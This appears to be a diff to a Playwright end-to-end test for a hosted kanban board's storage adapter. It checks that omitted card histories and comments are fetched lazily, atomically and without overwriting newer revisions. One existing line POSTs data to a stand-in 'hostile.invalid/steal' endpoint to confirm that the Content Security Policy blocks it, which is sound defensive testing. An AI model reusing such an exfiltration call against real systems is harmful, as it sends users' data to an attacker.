@@ -4,6 +4,7 @@ const http = require('node:http');
 const fs = require('node:fs');
 const path = require('node:path');
 const { chromium } = require('playwright');
+const { HostedAdapter } = require('../../board/storage-hosted.js');
 const ROOT = path.resolve(__dirname, '../..');
 const BOARD = '30000000-0000-4000-8000-000000000001';
 const ACTOR = { user_id: '10000000-0000-4000-8000-000000000001', agent_id: null };
@@ -13,6 +14,47 @@ const FIXTURE_FILES = {"tasks.json": {"version": 4, "layout": "split", "next_num
 let files, revs, version, calls, receipts, conflict, lockRetry, denyApprove, omit, changed, expired;
 function reset() { files = clone(FIXTURE_FILES); revs = Object.fromEntries(Object.keys(files).map(p => [p, 'r1-' + p])); version = 1; calls = []; receipts = new Map(); conflict = lockRetry = denyApprove = changed = expired = false; omit = true; }
 reset();
+// Enough omitted cards to expose accidental fan-out, without using real board data.
+for (let i = 0; i < 299; i++) {
+  const p = `cards/t_lazy_${i}.json`;
+  files[p] = { ...clone(FIXTURE_FILES['cards/t_sample.json']), id: `t_lazy_${i}`, num: 1000 + i, title: `Synthetic lazy card ${i}` };
+  revs[p] = 'r1-' + p;
+}
+files['cards/t_lazy_3.json'].related = [{ id: 't_lazy_4', kind: 'related', status: 'possible' }];
+files['cards/t_lazy_4.json'].related = [{ id: 't_lazy_3', kind: 'related', status: 'possible' }];
+files['cards/t_lazy_298.json'].comments[0].text = 'uniquelazycommentneedle';
+const cardReads = () => calls.filter(c => c.url.includes('/files/cards%2F'));
+async function hydrationSafetyChecks() {
+  const a = new HostedAdapter({ api: 'http://127.0.0.1', board: BOARD });
+  const lazy = p => ({ body: { id: p.slice(6, -5), title: 'Captured title' }, rev: 'captured', omitted: ['history', 'comments'] });
+  const seed = () => new Map([['tasks.json', { body: { version: 4 } }], ...['cards/a.json', 'cards/b.json', 'cards/untouched.json'].map(p => [p, lazy(p)])]);
+  a.files = seed(); let reads = [], fail = false, newer = false;
+  a.request = async (method, route) => {
+    const p = decodeURIComponent(route.split('/files/')[1]); reads.push(p);
+    if (fail && p === 'cards/b.json') throw new Error('Synthetic read failure');
+    return { rev: newer ? 'newer' : 'captured', body: { id: p.slice(6, -5), title: 'Captured title', history: [{ text: 'Preserved audit' }], comments: [{ text: 'Preserved comment' }] } };
+  };
+  const captured = a.files; fail = true;
+  await assert.rejects(a.hydrate(['cards/a.json', 'cards/b.json']), /Synthetic read failure/);
+  assert.equal(a.files, captured, 'failed batch leaves the captured map intact');
+  assert.deepEqual(a.files.get('cards/a.json'), lazy('cards/a.json'), 'no partial hydration is published');
+  fail = false; newer = true;
+  await assert.rejects(a.hydrate(['cards/b.json']), e => e.status === 412);
+  assert.equal(a.files, captured, 'a newer full read cannot replace captured older state');
+  newer = false; reads = [];
+  await a.hydrate(['cards/a.json', 'cards/b.json']);
+  assert.deepEqual(reads, ['cards/b.json'], 'successful reads are reused when retrying an atomic batch');
+  assert.equal(a.files.get('cards/untouched.json').omitted.length, 2);
+  assert.equal(a.files.get('cards/a.json').body.history[0].text, 'Preserved audit');
+  // A poll/snapshot winning the race must survive an older read completing later.
+  a.files = seed(); let complete;
+  a.request = () => new Promise(resolve => { complete = resolve; });
+  const pending = a.hydrate(['cards/a.json']);
+  const current = new Map(a.files); current.set('cards/a.json', { ...lazy('cards/a.json'), rev: 'polled' }); a.files = current;
+  complete({ rev: 'captured', body: { id: 'a', history: [], comments: [] } });
+  await assert.rejects(pending, e => e.status === 412);
+  assert.equal(a.files, current, 'late hydration never overwrites a newer captured revision');
+}
 const file = p => ({ path: p, body: clone(files[p]), rev: revs[p], createdBy: ACTOR, updatedBy: ACTOR });
 function snapshot() {
   const root = file('tasks.json'); delete root.path;
@@ -45,7 +87,9 @@ const server = http.createServer(async (req, res) => {
     if (suffix === '/snapshot') return send(snapshot());
     if (suffix.startsWith('/files/')) { const p = decodeURIComponent(suffix.slice(7)); return files[p] ? send(file(p)) : error('not_found', 404); }
     if (suffix === '/changes') {
-      const batches = changed ? [{ cursor: 'c' + version, changes: [{ resource: 'file', path: 'cards/t_sample.json', rev: revs['cards/t_sample.json'], op: 'upsert', body: clone(files['cards/t_sample.json']) }] }] : [];
+      const delta = { resource: 'file', path: 'cards/t_sample.json', rev: revs['cards/t_sample.json'], op: 'upsert', body: clone(files['cards/t_sample.json']) };
+      if (omit) { delta.omitted = ['history', 'comments']; delete delta.body.history; delete delta.body.comments; }
+      const batches = changed ? [{ cursor: 'c' + version, changes: [delta] }] : [];
       changed = false; return send({ through: 'c' + version, has_more: false, batches });
     }
     if (req.method === 'POST') {
@@ -103,6 +147,7 @@ const server = http.createServer(async (req, res) => {
   const browser = await chromium.launch({ headless: true }); let passed = 0;
   const ok = name => { passed++; console.log('PASS ' + name); };
   try {
+    await hydrationSafetyChecks(); ok('targeted batches are atomic, preserve captured state on failure and reject newer or superseded revisions');
     const page = await browser.newPage(); const errors = [], github = [];
     page.on('pageerror', e => errors.push(e.message));
     page.on('request', req => { const host = new URL(req.url()).hostname; if (/(^|\.)(github\.com|githubusercontent\.com|githubassets\.com)$/.test(host)) github.push({ url: req.url(), headers: req.headers(), body: req.postData() }); });
@@ -118,14 +163,62 @@ const server = http.createServer(async (req, res) => {
     assert.equal(calls.length, 0, 'hosted boot does not read GitHub or private data before sign-in');
     await page.locator('#hostedKey').fill('synthetic-publishable'); await page.locator('#hostedEmail').fill('synthetic@example.test'); await page.locator('#hostedPassword').fill('synthetic-password'); await page.locator('#hostedSignIn').click();
     await page.getByText('Synthetic contract sample', { exact: true }).first().waitFor();
-    assert.ok(calls.some(c => c.url === '/v1/me')); assert.ok(calls.some(c => c.url.includes('/files/cards%2Ft_sample.json')));
+    assert.ok(calls.some(c => c.url === '/v1/me'));
+    assert.equal(Object.keys(files).filter(p => p.startsWith('cards/')).length, 300);
+    assert.ok(await page.locator('.card').count() > 0);
+    assert.equal(cardReads().length, 0, '300-card load never requests omitted histories');
+    files['cards/t_sample.json'].details = 'Closed drawer poll'; revs['cards/t_sample.json'] = 'closed-poll'; version++; changed = true;
+    await page.waitForFunction(() => document.querySelector('.card')?.textContent && document.getElementById('status').textContent.startsWith('Synced'));
+    await page.waitForResponse(r => r.url().includes('/changes?after='));
+    assert.equal(cardReads().length, 0, 'polling with the drawer closed never hydrates cards');
+    await page.locator('.col[data-col="in-progress"] .cards').evaluate(col => {
+      const dataTransfer = new DataTransfer(); dataTransfer.setData('text/plain', 't_lazy_0');
+      col.dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer }));
+    });
+    await page.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
+    assert.equal(files['cards/t_lazy_0.json'].column, 'in-progress');
+    assert.deepEqual(cardReads().map(c => c.url.split('/files/')[1]), ['cards%2Ft_lazy_0.json'], 'drag hydrates exactly the moved card');
+    assert.deepEqual(files['cards/t_lazy_0.json'].history, FIXTURE_FILES['cards/t_sample.json'].history);
+    ok('drag hydrates exactly one captured card and preserves its omitted fields');
+    const commandsBeforeRefusal = calls.filter(c => c.url.endsWith('/commands')).length;
+    await page.route('**/files/cards%2Ft_lazy_1.json', route => route.fulfill({ json: { ...file('cards/t_lazy_1.json'), rev: 'unexpected-newer', body: { title: 'Must not replace captured title' } } }));
+    await page.locator('.col[data-col="in-progress"] .cards').evaluate(col => {
+      const dataTransfer = new DataTransfer(); dataTransfer.setData('text/plain', 't_lazy_1');
+      col.dispatchEvent(new DragEvent('drop', { bubbles: true, cancelable: true, dataTransfer }));
+    });
+    await page.waitForFunction(() => document.getElementById('status').textContent.includes('revision_conflict'));
+    assert.equal(calls.filter(c => c.url.endsWith('/commands')).length, commandsBeforeRefusal, 'hydration revision mismatch prevents mutation');
+    assert.equal(files['cards/t_lazy_1.json'].column, 'backlog');
+    await page.getByText('Synthetic lazy card 1', { exact: true }).first().waitFor();
+    await page.unroute('**/files/cards%2Ft_lazy_1.json');
+    ok('mutation rejects a newer full read and keeps captured card state without posting');
+    const drawerReadsBefore = cardReads().length;
     await page.locator('#btnFilter').click(); await page.locator('#sortMenu').selectOption('newest');
     await page.locator('#btnFilter').click();
     assert.equal(new URL(page.url()).searchParams.get('api'), base, 'filter routing retains hosted endpoint');
     assert.equal(new URL(page.url()).searchParams.get('board'), BOARD);
-    ok('sign-in, verified identity, snapshot and omitted-history hydration');
+    ok('300-card load and closed-drawer polling render with zero history reads');
 
+    let releaseDrawer;
+    const drawerGate = new Promise(resolve => { releaseDrawer = resolve; });
+    let failDrawer = true, drawerRequests = 0;
+    await page.route('**/files/cards%2Ft_sample.json', async route => {
+      drawerRequests++; await drawerGate;
+      if (failDrawer) await route.fulfill({ status: 500, json: { error: { code: 'synthetic_failure', message: 'Read failed' } } });
+      else await route.continue();
+    });
     await page.evaluate(() => { location.hash = '#17'; }); await page.locator('#dlgCard[open]').waitFor();
+    await page.getByText('Loading history and comments…', { exact: true }).waitFor();
+    assert.equal(await page.locator('#cTitle').inputValue(), 'Synthetic contract sample', 'drawer renders before full read completes');
+    releaseDrawer();
+    await page.getByText('Could not load history and comments.', { exact: true }).waitFor();
+    assert.equal(await page.locator('#cTitle').inputValue(), 'Synthetic contract sample', 'failed drawer hydration preserves captured fields');
+    failDrawer = false; await page.locator('#cmStream').getByRole('button', { name: 'Retry', exact: true }).click();
+    await page.locator('#cmStream').getByText('Invented comment', { exact: true }).waitFor();
+    assert.equal(drawerRequests, 2, 'one failed read and one explicit retry');
+    await page.unroute('**/files/cards%2Ft_sample.json');
+    assert.deepEqual(cardReads().slice(drawerReadsBefore).map(c => c.url.split('/files/')[1]), ['cards%2Ft_sample.json']);
+    ok('drawer shows immediately, then hydrates exactly its card with a loading state');
     lockRetry = true;
     await page.locator('#cTitle').fill('My synthetic title'); await page.locator('#cTitle').blur();
     await page.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
@@ -182,6 +275,18 @@ const server = http.createServer(async (req, res) => {
 
 
     await page.locator('#cClose').click(); await page.locator('#dlgCard').waitFor({ state: 'hidden' });
+    await page.waitForFunction(() => !/^#\d+$/.test(location.hash));
+    const relationReadsBefore = cardReads().length;
+    await page.evaluate(() => { const url = new URL(location.href); url.searchParams.delete('card'); history.replaceState(history.state, '', url); location.hash = '#1003'; });
+    await page.locator('#dlgCard[open]').waitFor();
+    await page.locator('#cmStream').getByText('Invented comment', { exact: true }).waitFor();
+    await page.locator('#cRelList [data-act="link"]').click();
+    await page.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
+    assert.deepEqual(calls.filter(c => c.url.endsWith('/commits')).at(-1).body.ops.map(op => op.path).sort(), ['cards/t_lazy_3.json', 'cards/t_lazy_4.json']);
+    assert.deepEqual([...new Set(cardReads().slice(relationReadsBefore).map(c => c.url.split('/files/')[1]))].sort(), ['cards%2Ft_lazy_3.json', 'cards%2Ft_lazy_4.json'], 'two-card save reads only the touched pair');
+    assert.deepEqual(files['cards/t_lazy_4.json'].comments, FIXTURE_FILES['cards/t_sample.json'].comments);
+    await page.locator('#cClose').click(); await page.locator('#dlgCard').waitFor({ state: 'hidden' });
+    ok('multi-card relationship save hydrates only its touched pair and preserves omitted comments');
     const quick = page.locator('.col[data-col="backlog"] .add input');
     await quick.fill('New hosted card'); await quick.press('Enter');
     await page.waitForFunction(() => document.getElementById('status').textContent.startsWith('Saved'));
@@ -202,6 +307,22 @@ const server = http.createServer(async (req, res) => {
     await page.evaluate(() => { window.__cspViolations = []; document.addEventListener('securitypolicyviolation', e => window.__cspViolations.push(e.blockedURI)); });
     const hostile = await page.evaluate(async () => { try { await fetch('https://hostile.invalid/steal', { method: 'POST', body: 'synthetic' }); return false; } catch { return true; } });
     assert.equal(hostile, true); assert.ok((await page.evaluate(() => window.__cspViolations)).some(x => x.includes('hostile.invalid'))); ok('actual CSP blocks hostile origins');
+
+    const activityReadsBefore = cardReads().length;
+    let releaseActivity;
+    const activityGate = new Promise(resolve => { releaseActivity = resolve; });
+    await page.route('**/files/cards%2Ft_lazy_298.json', async route => { await activityGate; await route.continue(); });
+    await page.evaluate(() => { location.hash = '#view=activity'; });
+    await page.locator('#board').getByText('Loading history and comments…', { exact: true }).waitFor();
+    releaseActivity(); await page.locator('#board .actbar').waitFor();
+    await page.unroute('**/files/cards%2Ft_lazy_298.json');
+    assert.ok(cardReads().length - activityReadsBefore > 290, 'activity requests cross-card history only after being opened');
+    const searchReadsBefore = cardReads().length;
+    await page.evaluate(() => { location.hash = '#search'; }); await page.locator('#qQ').fill('uniquelazycommentneedle');
+    await page.locator('#qRes').getByText('Synthetic lazy card 298', { exact: true }).waitFor();
+    assert.equal(cardReads().length, searchReadsBefore, 'comment search reuses history already requested by activity');
+    await page.locator('#qClose').click();
+    ok('activity hydrates across cards on opening and comment search uses the hydrated index');
 
     await page.locator('#hostedSignOut').click(); await page.locator('#hostedSignIn').waitFor();
     await page.reload(); await page.locator('#hostedSignIn').waitFor();
